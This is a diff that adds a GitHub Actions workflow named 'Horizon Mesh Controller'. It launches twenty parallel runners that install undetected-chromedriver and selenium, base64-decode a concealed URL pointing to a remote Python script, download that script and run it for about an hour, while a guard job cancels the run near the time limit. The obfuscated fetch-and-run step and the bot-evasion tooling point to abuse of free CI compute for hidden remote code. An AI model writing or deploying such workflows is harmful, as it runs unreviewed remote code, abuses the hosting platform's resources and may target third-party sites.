@@ -1,0 +1,96 @@
+name: Horizon Mesh Controller
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: mesh-sync-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Guard Routine: Monitors duration and forces cancellation at 59m
+  # =================================================================
+  mesh-guard:
+    name: "System Guard Engine"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_TIMEOUT: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          printf "[GUARD] Watchdog initiated for session: %s\n" "${{ github.run_id }}"
+          printf "[GUARD] Holding active monitor for %s seconds.\n" "${WATCHDOG_TIMEOUT}"
+
+          sleep "${WATCHDOG_TIMEOUT}"
+
+          echo "[GUARD] Threshold reached. Issuing termination payload to pipeline."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARD] Signal emitted. All active instances marked for abortion."
+
+  # =================================================================
+  # Core Runner Matrix: Parallel execution on matrix endpoints
+  # =================================================================
+  mesh-worker:
+    name: "Worker-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [A101, B102, C103, D104, E105, F106, G107, H108, J109, K110, L111, M112, N113, P114, Q115, R116, S117, T118, U119, V120]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Phase 1: Environment Bootstrapping & Dependencies
+      # -----------------------------------------------------------------
+      - name: Setup System Dependencies
+        run: |
+          echo "[PHASE-1] Bootstrapping Worker-${{ matrix.node_key }}..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Phase 2: Remote Script Retrieval
+      # -----------------------------------------------------------------
+      - name: Fetch Core Script
+        run: |
+          echo "[PHASE-2] Resolving remote entry point..."
+          REMOTE_ENCODED_URI="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          TARGET_URL=$(echo "$REMOTE_ENCODED_URI" | base64 -d)
+          curl -sL "$TARGET_URL" -o runner_agent.py
+          echo "[PHASE-2] Fetch complete."
+
+      # -----------------------------------------------------------------
+      # Phase 3: Daemon Execution with Managed Lifecycle
+      # -----------------------------------------------------------------
+      - name: Execute Agent Process
+        run: |
+          echo ":: Executing agent instance for Node-${{ matrix.node_key }}..."
+
+          python3 runner_agent.py &
+          AGENT_PID=$!
+
+          echo ":: Instance launched under PID ${AGENT_PID}. Hard limit: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$AGENT_PID" 2>/dev/null; then
+            echo ":: Maximum threshold reached — sending SIGKILL to PID ${AGENT_PID}."
+            kill -9 "$AGENT_PID"
+            echo ":: Process terminated successfully."
+          else
+            echo ":: Instance finished prior to timeout threshold."
+          fi
